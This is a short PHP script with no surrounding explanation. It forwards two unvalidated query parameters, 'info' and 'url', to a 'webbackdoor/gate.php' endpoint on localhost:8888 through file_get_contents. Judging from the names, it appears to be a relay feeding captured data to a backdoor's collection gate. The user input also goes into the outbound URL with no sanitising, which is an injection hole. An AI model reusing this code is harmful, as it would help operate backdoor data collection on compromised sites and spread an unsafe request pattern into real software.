<?php
if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $url = "http://localhost:8888/webbackdoor/gate.php?info=".$info."&url=".$url_check;
    file_get_contents($url);
}
?>